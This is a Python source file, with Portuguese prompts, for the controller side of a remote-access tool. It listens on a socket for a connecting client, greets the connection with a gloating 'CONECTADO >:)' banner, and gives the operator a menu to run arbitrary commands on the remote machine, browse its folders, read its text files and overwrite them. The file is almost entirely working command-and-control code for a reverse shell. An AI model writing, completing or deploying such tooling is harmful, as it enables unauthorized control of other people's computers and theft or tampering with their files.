import socket
import os

host = "localhost"
porta = 50055

verde = "\033[32m"
cor = "\033[34m"
norm = "\033[m"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host, porta))
s.listen(20)
os.system("clear")
print("""
     __________
    /esperando/_______
___/_________/conetar/
     |   | /________/
     |   |        |
_____|   |        |""")
conn, addr = s.accept()
print(f"""     |   |        |
  ___|___|________|__
_| CONECTADO  >:)    |
 |___________________|
    _|___|________|______
   |{addr} |
   |_____________________|
""")
on_off = False
while not on_off:
    print(f"""{verde}

OPÇÕES>
EXIT    : sair
cmd     : comando direto
ls      : ver pastas
*cd     : mudar a pasta
pwd     : ver caminho
md file : modificar arquivo de texto
v file  : ver arquivo de texto
{norm}""")
    opc = str(input(f"{verde}[*]_[OPC]_[ {norm}"))
    if opc == "cmd":
        conn.send("cmd".encode())
        comando = str(input(f"{verde}[+]_[COMANDO]_[ {norm}"))
        conn.send(comando.encode("utf-8"))
        cliente = conn.recv(2048).decode()
        print(f"\n{cor}====\n {cliente} \n===={norm}")
    elif opc == "EXIT":
        on_off = True
    elif opc == "ls":
        conn.send("ls".encode("utf-8"))
        cliente = conn.recv(2048).decode("utf-8")
        print(f"\n{cor}[\n {cliente} ]{norm}")
    elif opc == "*cd":
        conn.send("*cd".encode("utf-8"))
        caminho_1 = str(input(f"{verde}[+]_[CAMINHO DESEJADO]_[ {norm}"))
        conn.send(caminho_1.encode("utf-8"))
    elif opc == "pwd":
        conn.send("pwd".encode("utf-8"))
        cliente = conn.recv(2048).decode("utf-8")
        print(f"\n{cor}[\n {cliente} ]{norm}")
    elif opc == "md file":
        conn.send("md file".encode("utf-8"))
        arquivo_enviar = str(input(f"\n{verde}[+]_[NOME DO ARQUIVO PARA ENVIAR]_[{norm} "))
        arquivo_receber = str(input(f"\n{verde}[+]_[NOME DO ARQUIVO PARA RECEBER]_[{norm} "))
        conn.send(arquivo_receber.encode("utf-8"))
        try:
            with open(arquivo_enviar, 'r') as arquivo_aberto:
                arquivo_txt = arquivo_aberto.read()
            conn.send(arquivo_txt.encode("utf-8"))
            dados = conn.recv(2048).decode("utf-8")
            if dados == "sim":
                print(f"\n{cor}ERRO AO ABRIR ARQUIVO{norm}")
            else:
                print(f"\n{cor}ARQUIVO MODIFICADO")
        except:
            conn.send("erro-*4*0*4".encode("utf-8"))
            print(f"\n{verde}ERRO AO ENVIAR, VERIFIQUE SE O ARQUIVO EXISTE\nOU SE O ARQUIVO DO CLIENTE ESTA CORRETO{norm} ")
    elif opc == "v file":
        conn.send("v file".encode("utf-8"))
        try:
            ver_arquivo = str(input(f"{verde}[+]_[VER ARQUIVO DE TEXTO]_[ {norm}"))
            conn.send(ver_arquivo.encode("utf-8"))
            ver_arquivo = conn.recv(9000).decode("utf-8")
            if ver_arquivo != "eRR_1":
                print(f"\n{cor}{ver_arquivo}{norm}")
            else:
                print(f"\n{cor}ERRO AO ABRIR O ARQUIVO{norm}")
        except:
            conn.send("eRR_1".encode("utf-8"))
            ver_arquivo = conn.recv(2048).decode("utf-8")
            print(f"\n{cor}{ver_arquivo}{norm}")
    else:
        print("\nCOMANDO NÃO EXISTE")
s.close()